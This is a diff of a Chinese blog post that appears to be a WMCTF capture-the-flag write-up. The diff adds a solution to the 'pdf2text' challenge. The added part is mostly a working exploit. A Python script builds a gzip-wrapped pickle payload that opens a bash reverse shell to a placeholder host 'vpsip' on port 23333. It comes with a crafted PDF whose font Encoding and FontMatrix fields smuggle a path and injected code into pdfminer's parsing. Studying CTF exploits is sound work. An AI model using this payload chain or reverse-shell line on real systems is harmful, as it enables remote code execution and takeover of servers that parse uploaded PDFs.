@@ -85,7 +85,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#guess"><span class="toc-number">2.</span> <span class="toc-text">guess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pdf2text%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">pdf2text（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shopping-company1%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">Shopping company1（Unsolved）</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#guess"><span class="toc-number">2.</span> <span class="toc-text">guess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pdf2text%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">pdf2text（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shopping-company1%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">Shopping company1（Unsolved）</span></a></li></ol>
     </div>
   
 
@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.8k字</span>
+        <span class="post-count">2.5k字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">13分</span>
       </span>
     </span>
     
@@ -287,6 +287,8 @@
     
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>wmc.tf 吗，唉舞萌吃</p>
+<p>参考：</p>
+<p>MNGA 的 WP：<a target="_blank" rel="noopener" href="https://wx.zsxq.com/group/824215518412">https://wx.zsxq.com/group/824215518412</a></p>
 <span id="more"></span>
 
 <hr>
@@ -475,7 +477,7 @@ response <span class="token operator">=</span> requests<span class="token punctu
 
 
 <hr>
-<h1 id="pdf2text（Unsolved）"><a href="#pdf2text（Unsolved）" class="headerlink" title="pdf2text（Unsolved）"></a>pdf2text（Unsolved）</h1><p>链子跟出来了最后死在传 pickle 上了</p>
+<h1 id="pdf2text（复现）"><a href="#pdf2text（复现）" class="headerlink" title="pdf2text（复现）"></a>pdf2text（复现）</h1><p>链子跟出来了最后死在传 gz 上了</p>
 <p>app.py</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template
 <span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfparser <span class="token keyword">import</span> PDFParser
@@ -601,6 +603,184 @@ high_level.extract_pages<span aria-hidden="true" class="line-numbers-rows"><span
 &gt;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>但是和正常命令行的 <code>gzip -d</code> 不一样，python 的 gzip 解压缩极其严格，即使在 gzip 包的最后追加明文也会判定为不通过</p>
+<br>
+其实，gzip 可以指定压缩等级，等级为 0 基本都是明文...
+
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gzip
+
+source <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""cos
+system
+p0
+0g0
+(S'bash -c "bash -i >&amp; /dev/tcp/vpsip/23333 0>&amp;1"'
+tR.
+"""</span>
+<span class="token keyword">with</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pickle.gz"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>
+    f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
+    pdf_content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> gzip<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>pdf_content<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pickle.gz"</span><span class="token punctuation">,</span> <span class="token string">"ab"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>
+        f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1.pdf</p>
+<pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">%PDF-1.4
+%DUMMY
+8 0 obj
+&lt;&lt;
+&#x2F;PatternType 2
+&#x2F;Shading&lt;&lt;
+  &#x2F;Function&lt;&lt;
+    &#x2F;Domain[0 1]
+    &#x2F;C0[0 0 1]
+    &#x2F;C1[1 0.6 0]
+    &#x2F;N 1
+    &#x2F;FunctionType 2
+  &gt;&gt;
+  &#x2F;ShadingType 2
+  &#x2F;Coords[46 400 537 400]
+  &#x2F;Extend[false false]
+  &#x2F;ColorSpace&#x2F;DeviceRGB
+&gt;&gt;
+&#x2F;Type&#x2F;Pattern
+&gt;&gt;
+endobj
+5 0 obj
+&lt;&lt;
+&#x2F;Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]
+&#x2F;Type&#x2F;Font
+&#x2F;BaseFont&#x2F;PAXEKO+SourceSansPro-Bold
+&#x2F;LastChar 102
+&#x2F;Encoding &#x2F;#2Fapp#2Fuploads#2F1
+&#x2F;FontMatrix [0.1 0 0 0.1 0 (1\);\nprint\(&quot;&quot;\)\n&#x2F;&#x2F;)]
+&#x2F;Subtype&#x2F;CIDFontType0
+&#x2F;FirstChar 65
+&#x2F;FontDescriptor 9 0 R
+&#x2F;ToUnicode 11 0 R
+&gt;&gt;
+endobj
+2 0 obj
+&lt;&lt;
+&#x2F;Kids[3 0 R]
+&#x2F;Type&#x2F;Pages
+&#x2F;Count 1
+&gt;&gt;
+endobj
+9 0 obj
+&lt;&lt;
+&#x2F;Type&#x2F;FontDescriptor
+&#x2F;ItalicAngle 0
+&#x2F;Ascent 751
+&#x2F;FontBBox[-6 -12 579 713]
+&#x2F;FontName&#x2F;PAXEKO+SourceSansPro-Bold
+&#x2F;StemV 100
+&#x2F;CapHeight 713
+&#x2F;Flags 32
+&#x2F;FontFile3 10 0 R
+&#x2F;Descent -173
+&#x2F;MissingWidth 250
+&gt;&gt;
+endobj
+6 0 obj
+&lt;&lt;
+&#x2F;Length 128
+&gt;&gt;
+stream
+47 379 489 230 re S
+&#x2F;Pattern cs
+BT
+  50 500 Td
+  117 TL
+  &#x2F;F1 150 Tf
+  &#x2F;P1 scn
+  (AbCdEf) Tj
+  &#x2F;P2 scn
+  (AbCdEf) &#39;\nET
+endstream
+endobj
+3 0 obj
+&lt;&lt;
+&#x2F;Type&#x2F;Page
+&#x2F;Resources 4 0 R
+&#x2F;Contents 6 0 R
+&#x2F;Parent 2 0 R
+&#x2F;MediaBox[0 0 595.2756 841.8898]
+&gt;&gt;
+endobj
+10 0 obj
+&lt;&lt;
+&#x2F;Length 800
+&#x2F;Subtype&#x2F;Type2
+&gt;&gt;
+stream
+
+endstream
+endobj
+7 0 obj
+&lt;&lt;
+&#x2F;PatternType 1
+&#x2F;Matrix[1 0 0 1 50 0]
+&#x2F;Length 58
+&#x2F;TilingType 1
+&#x2F;BBox[0 0 16 16]
+&#x2F;YStep 16
+&#x2F;PaintType 1
+&#x2F;Resources&lt;&lt;
+&gt;&gt;
+&#x2F;XStep 16
+&gt;&gt;
+stream
+0.65 g
+0 0 16 16 re f
+0.15 g
+0 0 8 8 re f
+8 8 8 8 re f
+endstream
+endobj
+4 0 obj
+&lt;&lt;
+&#x2F;Pattern&lt;&lt;
+  &#x2F;P1 7 0 R
+  &#x2F;P2 8 0 R
+&gt;&gt;
+&#x2F;Font&lt;&lt;
+  &#x2F;F1 5 0 R
+&gt;&gt;
+&gt;&gt;
+endobj
+1 0 obj
+&lt;&lt;
+&#x2F;Pages 2 0 R
+&#x2F;Type&#x2F;Catalog
+&#x2F;OpenAction[3 0 R &#x2F;Fit]
+&gt;&gt;
+endobj
+xref
+0 11
+0000000000 65535 f
+0000002260 00000 n
+0000000522 00000 n
+0000000973 00000 n
+0000002178 00000 n
+0000000266 00000 n
+0000000794 00000 n
+0000001953 00000 n
+0000000015 00000 n
+0000000577 00000 n
+0000001085 00000 n
+trailer
+&lt;&lt;
+&#x2F;ID[(DUMMY) (DUMMY)]
+&#x2F;Root 1 0 R
+&#x2F;Size 11
+&gt;&gt;
+startxref
+2333
+%%EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <hr>
 <h1 id="Shopping-company1（Unsolved）"><a href="#Shopping-company1（Unsolved）" class="headerlink" title="Shopping company1（Unsolved）"></a>Shopping company1（Unsolved）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">
 <span class="token decorator annotation punctuation">@tool</span> <span class="token keyword">def</span> <span class="token function">extract_and_analyze_archive</span><span class="token punctuation">(</span>file_url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">""" 解压并分析压缩包内容
